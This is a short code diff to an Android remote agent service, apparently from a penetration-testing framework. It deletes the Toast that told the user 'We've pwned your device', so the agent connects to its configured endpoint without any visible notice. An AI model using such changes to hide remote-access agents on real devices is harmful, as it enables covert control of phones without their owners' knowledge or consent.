@@ -5,7 +5,6 @@ import java.io.InputStream;
 import java.math.BigInteger;
 import java.security.SecureRandom;
 import java.util.HashMap;
-import java.util.Locale;
 import java.util.Map;
 
 import com.mwr.jdiesel.api.DeviceInfo;
@@ -17,7 +16,6 @@ import android.content.Context;
 import android.content.Intent;
 import android.os.IBinder;
 import android.provider.Settings;
-import android.widget.Toast;
 
 public class Agent extends Service {
 	
@@ -75,8 +73,6 @@ public class Agent extends Service {
 				configuration.get("password"));
 		this.client = new Client(this.endpoint, this.device_info);
 		this.client.start();
-		
-		Toast.makeText(this, String.format(Locale.ENGLISH, "Thanks. We've pwned your device.", endpoint.toConnectionString()), Toast.LENGTH_SHORT).show();
 	}
 	
 	@Override
